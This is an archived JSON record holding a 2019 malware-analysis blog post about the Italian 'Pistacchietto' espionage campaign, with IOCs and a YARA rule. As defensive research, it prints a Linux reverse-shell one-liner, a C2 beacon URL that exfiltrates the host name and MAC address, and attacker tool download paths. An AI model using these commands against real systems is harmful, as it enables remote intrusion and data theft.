{
    "id": "a1141fa8-9122-425f-9db2-1460ed4010ff",
    "created_at": "2022-10-25T16:48:21.202791Z",
    "updated_at": "2025-03-27T02:05:36.004888Z",
    "deleted_at": null,
    "sha1_hash": "fc4dc028e5a66d4b050a04ab4216843f0c4ee2f2",
    "title": "",
    "authors": "",
    "file_creation_date": "2019-03-07T09:52:38Z",
    "file_modification_date": "2019-03-07T09:52:38Z",
    "file_size": 1857947,
    "plain_text": "# Op. “Pistacchietto”: An Italian Job\n\n**[blog.yoroi.company/research/op-pistacchietto-an-italian-job](https://blog.yoroi.company/research/op-pistacchietto-an-italian-job/)**\n\nZLAB-YOROI March 6, 2019\n\n## Introduction\n\nIn the past weeks, a new strange campaign emerged in the Italian landscape. It has been\nbaptized “Operation Pistacchietto” from a username extracted from a Github account used\nto serve some part of the malware. This campaign has been initially [studied by C.R.A.M.](https://www.tgsoft.it/italy/news_archivio.asp?id=987)\nresearchers reporting the attacker seems to be Italian, as evidenced by some Italian\nwords like “pistacchietto” or “bonifico” discovered into analyzed file names and scripts, and\ndue to the location of most of the command and control servers.\n\nFigure 1. Servers’ location.\n\nAfter an initial recon, Cybaz-Yoroi ZLAB detected some peculiarities and interesting TTPs\nin place in this malicious operation, so we decided to dig further and analyze more\nsamples related to this mysterious actor.\n\n## Technical analysis\n\nThe campaign is not very trivial and it is composed by several, specific, malwares, created\nto hit devices belonging to different platforms, both desktop and mobile. In the following\nsections, we analyze some of these malware, divided by targets’ architecture.\n\n\n-----\n\ny p g, g p\nclicking on the link.\n\nFigure 2. Fake Java update page.\n\nDespite the page reports the filename “window-update.hta”, clicking on “Update” a file .bat\nwill be downloaded.\n\nHash a22ac932707e458c692ba72e5f4ddb3317817ac3a9a1ccbcccbdf720a9bd2cd4\n\nThreat Unknown\n\n\nDescrip‐\ntion\n\n\nBAT downloader\n\n\nssdeep 192:/eIsseWdvqEB45kY7EBk2k0EBxbkdEBBmk/kgkWOQmxl1LXqiV/uvN:/wyB4WYw‐\nBkRNBeKBBBsDWwFw\n\nUploading this .bat file on VirusTotal emerges that it has a very low detection rate: only\nfour anti-malwares were able to detect it.\n\nFigure 3. Detection rate of the initial BAT dropper.\n\nInspecting the win.bat source code, at first glance, it seems to be written by a script kiddie\nor to be a first draft due the huge amount of comments. Moreover, the script is composed\nby two part: a first one includes a trick to ask user administrative privileges, the second\none aims to download other components and to set persistence using the Windows Task\nScheduler (schtasks). As shown in figure, the first part simply corresponds to a code\nsnipped retrieved from [Github public repositories.](https://gist.github.com/lances101/44118a5ab320542f9591c5fa5b74ae02)\n\n\n-----\n\nFigure 4. Comparison between the attacker’s code and the Github’s one.\n\nThe second part, instead, checks the machine architecture and, depending on it, the\nmalware downloads the right components, that are:\n\nA text file containing new actions to execute, from config01.homepc[.it/svc/wup.php?\n_pc=pdf_%computername%_\nThe NETCAT utility for Windows, from config01.homepc[.it/win/nc64.exe and\n_config01.homepc[.it/win/nc.exe_\nThe WGET utility for Windows, from config01.homepc[.it/win/wget.exe and\n_config01.homepc[.it/win/wget32.exe_\nOther malicious artifacts, from:\n\n_config01.homepc[.it/win/get.vbs_\n_config01.homepc[.it/win/sys.xml_\n_config01.homepc[.it/win/syskill.xml_\n_config01.homepc[.it/win/office_get.xml_\n_config01.homepc[.it/win/woffice.exe_\n_config01.homepc[.it/win/init.vbs_\n_config01.homepc[.it/win/winsw.exe_\n\nFigure 5. Part of BAT dropper’s code.\n\nFrom the snippet, a series of commented URL paths emerge, which is the proof that the\nmalware is under maintenance yet. During the analysis days, indeed, the bat file and\nsome other artifacts are constantly changed and updated, adding and removing code\nlines, changing variables names, but without changing the server URL or the general\nbehavior. These modifications, even if related to attacker’s proofs or test cases, make the\n\n\n-----\n\nhxxps://github[.com/pistacchietto/Win-Python-Backdoor/raw/master\nhxxp://verifiche.ddns[.net/{some_files}\n\nInspecting the repository, we found some artifacts also hosted on the\n_config01.homepc[.it/win/ location, so probably the attacker used that platform during the_\ndevelopment phase and config01.homepc.it as real server containing “production”\nmalware. The URL verifiche.ddns[.net seems to be down at time of writing, it could be a\nserver used in an old version of this malicious project or in a future one.\n\nAfter downloading all the components, the batch script implants most of them into\n_%windir% folder and one of them, the core of the malware, into C:\\Program Files\\Windows_\n_Defender. Then, the script registers some automatic tasks through schtasks in order to_\nstart periodically the malicious artifacts.\n\nFigure 6. Instructions to schedule the backdoor execution.\n\nThe following section reports a brief analysis of these malicious files.\n\n#### Sample “office_get.xml”\n\nHash 1061e997486c793ab5561fd7df0c2eb36b9390a564101e7ae5cc8dbf9541f750\n\nThreat Unknown\n\n\nDe‐\nscrip‐\ntion\n\n\nXML Task Scheduler Config\n\n\nssdeep 48:yei1q9dBQSRiylw9c9V9LTra+iaiudupRCRvA9ufAuRa7T5XHPsV8icvOyp+++:tdBd‐\nRiyuwdiaigVA9ll7dHFFvOC+\n\nIt is a simple XML file in which is defined the configuration for a new scheduled task. In\nparticular, the task created using this configuration file has the only purpose of execute, in\nperiodic way, a VisualBasic script located in C:\\WINDOWS\\get.vbs.\n\nFigure 7. Command embedded into XML file.\n\n#### Sample “get.vbs”\n\n\n-----\n\nThreat Unknown\n\n\nDe‐\nscrip‐\ntion\n\n\nVBS script\n\n\nssdeep 48:eTGvmB9tJWBVn/Bn6+pmcN+yEa/5noEW/hRbr94fIn9+0RYcSniTGFurRwx:eT‐\nGO1Yr/V6gmDyPJoE0hxGfIn9D1ITlx\n\nThe script downloads a shared file from Google Drive: https://drive.google [.com/uc?\nexport=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF\n\nusing a MSXML2.ServerXMLHTTP object. The file contains a list of servers URLs, as\nshown in figure:\n\nFigure 8. C2’s IP addresses.\n\nTwo of them are IPv6 addresses: the usage of the new IP address standard is a rare\nfeature in malware landscape. From the whois information related to these IPv6 addresses\nemerges that they are registered on the global ISP Hurricane Electric. This company also\nprovides a free IPv6 Tunnel Broker service, able to act as a link between IPv4 and IPv6\nprotocols. There is no direct evidence of activity on that IPv6 addresses, however we think\nprobably the attacker decided to masquerades its C2, which normally works over IPv4,\nbehind the Hurricane’s IPv6 tunnel in order to make detection more difficult.\n\nDuring the check-in, the malware proceed to extract some PC information, like computer\nname and MAC address, which will be sent to the server using a path composed by:\n\nhttp://\" & serverURL & \"/svc/wup.php?pc=\" & strComputerName & \"_\" & mac\n\nThe server responds with an encoded message indicating new actions the malware\nshould perform. However, the VBS script seems to check only the “exec” field, as shown in\nfigure.\n\nFigure 9. Response from C2.\n\nIf “exec” parameter is set to “1”, then the script extracts the value of “cmd” parameter,\ncontaining the new command to execute, and run it on Shell. All the other fields, at the\nmoment, are not considered by the malware, indicating that it may be still under\ndevelopment.\n\n\n-----\n\nFigure 10. If EXEC parameter is set, execute the specified command.\n\nAfter executing the received commands, the script opens connection towards malicious\nserver using the Netcat tool previously downloaded, providing to the attacker an access to\nthe victim’s shell.\n\nFigure 11. Command to establish remote connection towards C2.\n\n#### Samples “woffice.exe”, “woffice2.exe” and “NisSrv.exe”\n\nHash 3eecd459aa454f7973048af310c7086ff4a74efd5a3aee9f909cca324a0e2013\n\nThreat Unknown\n\n\nDescrip‐\ntion\n\n\nEXE from woffice\n\n\nssdeep 196608:eC0ma2TBEF4nfFzqgncRxhocAU/kfCf+51loM8XdFu/apXLl:eCI26dGnf‐\nCW51ittnNLl\n\nThe “woffice2.exe” and “NisSrv.exe” files are equal to “woffice.exe”, which is simply the\ncompiled version of “woffice.py”, the Python source file hosted in the “Pistacchietto”\nrepository. The Python code has the same behavior of the VBS bot previously analyzed,\nbut it uses different C2 URLs, such as:\n\nFigure 12. Other C2’s IP embedded into\n“woffice.py” file .\n\nSo, the attacker created different copies\nof the same malicious backdoor, and set\nthem to run at the same time, probably as resilience technique.\n\n#### Samples “sys.xml” and “syskill.xml”\n\nHash a9f5e4c294ce6fb3bbdc4cd1ce3b23136005ce1dd57b2e8d20ed2161eea9f62b\n\nThreat Unknown\n\n\nDescrip‐\ntion\n\n\nXML Task Scheduler Config\n\n\nssdeep 48:yei1q9dBQSJiydw9c9V9Lvara+iaiudupRCRvA9ufAuRa7T5XhPsV8iILG+++:tdBdJiy‐\nGiGdiaigVA9ll7dhF2+\n\nHash 6d3e7adcf9626bbee6935c6e8ced13831ac419be19b9d13bc361bda402fbaca7\n\n\n-----\n\ntion\n\nssdeep 48:yei1q9dtQSJiydw9c9V9Lvara+iaiudupRCRvA9ufAuRa7T5XhPsV8ioXy+++:tdtdJiyGi‐\nGdiaigVA9ll7dhF0+\n\nThese files are two XML task scheduler configurations, which embed the following\ncommands:\n\nFigure 13. Commands embedded into XML file.\n\nSo, the first one starts a TCP connection every 1 minute using Netcat (“nc64.exe”), as\npreviously shown, towards a new server “config02.addns[.org”. The second one, instead,\nkills all the active processes named “nc64.exe” every 5 minutes.\n\n### Linux, OSX and Android Samples\n\nThe attacker’s arsenal seems to be composed by weapons for different architectures:\nbeyond Windows, there are some samples related to Linux, Mac and Android devices.\n\nIn the Windows, Linux and Mac variant of the malware, the behavior is always the same: it\nimplants the automatic execution of the Python backdoor previously shown.\n\nHash 61aaf7b301ed9f574ec3e37428e0e9c62875ddf8a075897408d5b1eb612097cc\n\nThreat Unknown\n\n\nDe‐\nscrip‐\ntion\n\n\nOffice.py Linux backdoor\n\n\nssdeep 96:Urlxr+CkrZcGbSRonYZm/ZCweAM2eiuVzZ9Q6CsW7XpyMZEg59y5E6AwKwA:U7+C\nkrZcfnZgZEiuWEMZHs5E6+\n\nIn the following figure is shown the initial bash file used to set the schedule of the\n“woffice.py” backdoor, through the “crontab” and “systemctl” Linux commands.\n\n\n-----\n\nFigure 14. Linux initial BASH dropper.\n\nObviously, all the Windows commands executed into the Win version of the backdoor\nmust be replaced by the Unix one. So, the command “bash -i >& /dev/tcp/ip/port 0>&1”\ntakes the place of the instruction used to establish the Netcat reverse shell in Windows.\n\nFigure 15. Linux commands used to establish a connection with C2.\n\nThe Mac backdoor is very similar to Linux one, another time the “woffice.py” is the core\npayload.\n\nHash 008bab1cc06a8c9fcdbc0e539d7709de0d163acaf26d90c78c00e7c58fa29fc3\n\nThreat Unknown\n\n\nDescrip‐\ntion\n\n\nOffice.py OSX backdoor\n\n\nssdeep 96:qTXEPcRrdj9iGxGy8g/VEhhBpypDR9jxmCY3leO2pDR9jx5jYO74MkWI7G9xcst:q9‐\ndue/cfypO2z4M2Gl\n\nFigure 16. OSX backdoor’s setup file.\n\nAnalyzing the repository emerges it is a copy of a OSX backdoor discussed in this blog\npost. Starting from this code, the attacker edited some modules to embed it in its own\nversion of the backdoor.\n\nMoreover, the arsenal malicious arsenal counts also an Android RAT. It is a copy of the\n[popular “AhMyth Android Rat”, edited by the attacker to include its command and control](https://github.com/AhMyth/AhMyth-Android-RAT)\nserver’s IP addresses.\n\n\n-----\n\nFigure 17. Part of AhMyth RAT’s code modified by the attacker.\n\n## Conclusions\n\nThe “Pistacchietto” operation is more complex than we initially thought. Behind the lack of\nprofessional infrastructure, the “hiding in plain sight” strategy, the developer’s comments,\nthe drafted malware code analyzed and the speculations about the possible amateur\nnature of this actor, we are in front of a long running espionage operation, active from\nyears, and supporting at least four of the main computing platforms available nowadays,\nbeing able to infect Microsoft Windows hosts, Mac OSX systems, Linux servers and\nAndroid mobile devices.\n\nWe are still not aware of the purposes of this campaign, which could be most likely\npersonally motivated rather than financially or state sponsored, but despite its limited\nnumbers it represent an important warning security communities, individuals and\ncompanies should not ignore. Offensive capabilities to run criminal espionage operations\nare getting even more accessible to personally motivated cyber actors, confirming the\nexpansion of the cyber threat panorama both in terms of volume and variety observed by\nsecurity firms, observatories and associations from a decade ago to nowadays.\n\n\n-----\n\n(homemade) espionage operations: back in 2017 the initially homemade Occhionero s\nespionage campaign (CERT-Yoroi Early Warning [N010117) lapped Public Administrations,](https://blog.yoroi.company/warning/cyber-spionaggio-il-caso-eyepyramid/)\nnotorious entrepreneurs and also the Italian Ex Prime Minister.\n\n## Indicators of compromise\n\nC2:\n\nhxxp://config01.homepc[.it\nhxxp://verifiche.ddns[.net\nhxxps://github[.com/pistacchietto/Win-Python-Backdoor/raw/master\nhxxp://paner.altervista[.org\nhxxp://config02.addns[.org\ncertificates.ddns[.net\n52.26.124[.145\nvisionstore[.info\n\n[2001:470: 25:686::2]\n\n[2001:470: 1f0a:12af::2]\n\nHashes\n\n40e01c946618942c90851a09cb3e43c1e4d1e7d999ac97e9dab0f0a6222ca3ff\n(win.bat 20190225)\na22ac932707e458c692ba72e5f4ddb3317817ac3a9a1ccbcccbdf720a9bd2cd4\n(win.bat 20190226)\nd55331abdcedb96be387c70ddf8dd8d783cdf24be7e37e9913939f87e4a6b248\n(win.bat 20190227)\n1061e997486c793ab5561fd7df0c2eb36b9390a564101e7ae5cc8dbf9541f750\n6edbf8b3f94d29be7c24676fbf2d1e4cdf00b1f7b9f31c2ce458d1e21b23af97\n3eecd459aa454f7973048af310c7086ff4a74efd5a3aee9f909cca324a0e2013\na9f5e4c294ce6fb3bbdc4cd1ce3b23136005ce1dd57b2e8d20ed2161eea9f62b\n6d3e7adcf9626bbee6935c6e8ced13831ac419be19b9d13bc361bda402fbaca7\n18dec7d69a8eae1e78f8720ac3b6c8a5d1bb4c2f039a2d85bf77b01a82dc6912\nb11243ac75e5c3e343615889dbe28e51b1795dc5628e0f12e03b7192ca61bc60\ne1642bbe8a8ef616c97f34b835bc4f229f0e15c4619451e641462a44f476b46b\n6ec51cb47c72c572c683c07d971c80b9a4fc60c65c4e1af1524fb8595a653e0d\ncea68f294d0a21f19d79b2c3eefa762c1c295076c37c6c5b644e84e9a45dd2d2\n910e829f476fea4c406ebf760f4f8946448e236d110866f66c54257944d01906\n489d24447898ac587dedd8b8c097bf33ea7a3c639a978910f582015f4a229d5e\n688c5918872d45e1b375c3c65a453a8e891012fd9a4e35ceb1fa8cb24d2ffb68\n95280d20abbea35b435402ad06484938edad733dc94ba6271aed3cc1bd9887cf\nc2455b94bc8c5a05ebddf7e1736ca5a2bcbc728da6e07fb51a507ce9866d0ae8\n5b2f437bda3faa40073b441469694faae8f121b50b1fcfd6fdc0fa7288c082c9\n4087e880e5b658ff1f917fef17d2fd95c4382cefbbc08baf860cabd749c65e50\n505cedb52e044c7bdbd52ce7a392f78ccd7663ecfb07d23b314717dfacecf3f1\n0f1e223eaf8b6d71f65960f8b9e14c98ba62e585334a6349bcd02216f4415868\n097baea0616eaaab899f8d68e919bcaa66d77667a0f98b9ec643b7db980ec8d3\n24b47abad994181eb1ab660ec91d5fe4facd018d406f4312d6bc804a31254739\n5773e1821d336a1d72e72973319cc48f956ce4ff6888cd8734ee5a2c880fe484\n\n\n-----\n\nefbcf3682f1780ae0c567f8f5a747d1b04131f786047deee5c2be7b0ba2c2c67\n32ff81be7818fa7140817fa0bc856975ae9fcb324a081d0e0560d7b5b87efb30\n81fbea6c5eaa33ed02124afac06106626282f02daa0a2634f69afab1ce5f3fd4\n2af025abe916003123a04f09c1d9804e2f9340b439e41ea47b542f4ba8be68ef\n408344a29792bbd2bc1cf54dedfec7bc442251cc84ecfe0288f1d2d0c34f59a0\n9c034a07c0857eee1bc1cc1e1859230656a385dbbaa471e666af7372f94c8d1e\n6a72488747d12d129aacae76864b83de31f7c4ae357622e78fa43cf506d9c48e\n4a416b55d3a250d52747bd8b87a3b791f2b7b8df45217de60c6e35ad0de84b12\n04c6dfc497d175c8f755ee3d3722d33ee255ec8f2e6c2a9d1039345086bd6408\n46daac1a8aa83a0de63b7f70ac2f4ede61cd82ceba51ce00b804b37fb429521a\n2f2f0ea2f649ef120c111dfa020d333826d68d74cf1bed1fd3f1ef92e91a4413\n3d3df7bb13a774d394a0c9e3f40a54cc9daa0705887363845eaf7f60218111cc\ne2e4d23525389c13126401215541f5625258da18372cb5c98d0b95123a86acfb\nbe82341a12ea83d9efadc9ac35cf16d327f8499c99107dcde88dd0f5df84523c\nda15f169fff2f707ebffd2d1c78dc906ee9352c1d218ebe06d601c4b45382112\nc697b8502254a8305c6e77161e41c655b622876a933758139c16377298fd3f31\n498eec0b0cf5d945f77d4477e030f91f0e412631002f478622ef11ea0842eeba\n5bfc98f79d79b98ca39f3571a660d98eccba788578a7e8a3950d65714b721b50\n20a98a7e6e137bb1b9bd5ef6911a479cb8eac925b80d6db4e70b19f62a40cce2\n6ac2ab4b6cc96a8f5e5ff08d825c7ac14504878061607530f58f7a1b02c0bfac\n86c24972e3ef376dfef1ed144a32e9f549de6aabdc6aeadefb8125fccd5132c3\nb6a2dd050339d3991442f460fdb48f76d8eaad5fa233a261970fb6d9c73f2925\ne7693c69db0e1cc1c19f6c7df7711cc07512f2a53f1919639bf15f969e180c7a\n3655c6bc776688fd54d6ec9de51c7eb2512ac8f987bcd807e14a4accc13e5f11\nee86f083fdb8d5e2f4d1d609faf964fa08a01875bc0abb364aeb09bb83c35f8c\n04187ce5216fb1ef6ffe0fd2bcea6ae38ef055993b9d23f331d8c45e89510ade\nd11eff9047b71b82adce6089c3a845263846b124108b4b48220c3142393e89ad\n22d1a234507a76fd72d9c1948666da992d5a24e16c5791c806dd8d2ea2d141f5\n39316065605cbbccd9c9e7c9529ee2cd32d158ca7939888bfb811851ea6bef4c\n61aaf7b301ed9f574ec3e37428e0e9c62875ddf8a075897408d5b1eb612097cc\n008bab1cc06a8c9fcdbc0e539d7709de0d163acaf26d90c78c00e7c58fa29fc3\n\n## Yara rule\n\n\n-----\n\nrule pistacchietto_campaign_0219 {\nmeta:\ndescription = \"Yara rule for Pistacchietto campaign\"\nauthor = \"Yoroi ZLab - Cybaze\"\nlast_updated = \"2019-03-01\"\ntlp = \"white\"\ncategory = \"informational\"\n\nstrings:\n$nc = \"nc.exe\" wide ascii\n$nc64 = \"nc64.exe\" wide ascii\n$dns1 = \"config02.addns.org\" wide ascii\n$dns2 = \"config01.homepc.it\" wide ascii\n$dns3 = \"verifiche.ddns.net\" wide ascii\n$dns4 = \"paner.altervista.org\" wide ascii\n$dns5 = \"certificates.ddns.net\" wide ascii\n$id = \"pistacchietto\" wide ascii\n$path = \"/svc/wup.php?pc=\" wide ascii\ncondition:\n(1 of ($nc*)) and (1 of ($dns*)) or $id or $path\n}\n\n_This blog post was authored by Antonio Farina and Luca Mella of Cybaze-Yoroi Z-LAB_\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2019/2019.03.06.Operation_Pistacchietto/Operation_Pistacchietto.pdf"
    ],
    "report_names": [
        "Operation_Pistacchietto"
    ],
    "threat_actors": [],
    "ts_created_at": 1666716501,
    "ts_updated_at": 1743041136,
    "ts_creation_date": 1551952358,
    "ts_modification_date": 1551952358,
    "files": {
        "pdf": "https://archive.orkl.eu/fc4dc028e5a66d4b050a04ab4216843f0c4ee2f2.pdf",
        "text": "https://archive.orkl.eu/fc4dc028e5a66d4b050a04ab4216843f0c4ee2f2.txt",
        "img": "https://archive.orkl.eu/fc4dc028e5a66d4b050a04ab4216843f0c4ee2f2.jpg"
    }
}